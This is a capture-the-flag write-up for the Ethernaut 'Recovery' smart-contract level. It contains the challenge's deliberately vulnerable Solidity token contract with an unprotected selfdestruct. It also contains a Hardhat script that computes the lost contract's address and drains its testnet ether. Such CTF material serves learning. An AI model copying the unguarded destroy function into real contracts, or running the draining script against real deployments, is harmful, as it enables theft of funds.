## Recovery

### Challenge

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

### Background

There is not much new stuff going on here. The main difficulty here is to identify the address of the `SimpleToken` contract that was created from the `Recovery` contract. This can be done manually using the block explorer.

#### Edit

After finishing the challenge and reading the success message I relized that I missed one step that could simplify things a bit. The address of a new contract instance can be computed using `keccack256(address, nonce)` where the `address` is the address of the contract that instiates them, and `nonce` is an incremental value. This is the case because the contract is created using the `create` opcode.

There is also another opcode, `create2`, which uses another way to generate the `address` such that it is predictable.

### Attack

Going through the block explorer its easy to find the contract that was created by the `Recovery` contract. This contract must be a `SimpleToken` contract and is the one we are looking for. The next step is simply to call the `destroy` function with the attacker account address to get the contract funds.

* Check the `Recovery` contract transactions [here](https://rinkeby.etherscan.io/address/0x8fa7f6be7f007f88d80cc7d95a30e53343967238#internaltx)
* Find the `SimpleToken` contract [here](https://rinkeby.etherscan.io/address/0xbfb528f5fe26e884621cfd14e3e72fefabd1767c)
* Call the `destroy` function with the attack account address as argument on the `SimpleToken` contract

#### Edit

Instead of doing the first two steps we could simply use `keccack256(address, nonce)` with the `address` of the `Recovery` contract and a `nonce` of `1`.

#### recovery-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    recoveryAddress = "0x8Fa7f6be7f007F88D80cC7D95a30e53343967238";
    // contract = await ethers.getContractAt("Recovery", recoveryAddress);

    // this address was manually found using the block explorer
    // simpleTokenAddress = "0xbFB528f5Fe26E884621cfD14e3E72fEfABd1767c";

    // =================== Edit ===================
    // calculate the contract address
    simpleTokenAddress = ethers.utils.hexDataSlice(
        ethers.utils.keccak256(
            ethers.utils.RLP.encode(
                [recoveryAddress, "0x01"]
            )
        ), 12, 32)
    // ============================================

    contract = await ethers.getContractAt("SimpleToken", simpleTokenAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    console.log("Level address  : " + contract.address)
    console.log("Token Name     : " + await contract.name())

    // // get current balance
    console.log("Current Balance: " + await ethers.provider.getBalance(account.address))

    // trigger selfdestruct and return funds to account.address
    tx = await contract.connect(account).destroy(account.address)
    receipt = await tx.wait()

    // get new balance
    console.log("New Balance    : " + await ethers.provider.getBalance(account.address))

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/recovery-solve.js --network rinkeby
Level address  : 0xbFB528f5Fe26E884621cfD14e3E72fEfABd1767c
Token Name     : InitialToken
Current Balance: 137075271261352909
New Balance    : 137862327261352909
```

### Success Message

Contract addresses are deterministic and are calculated by `keccack256(address, nonce)` where the address is the `address` of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction `nonce`, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting [blog post](http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.
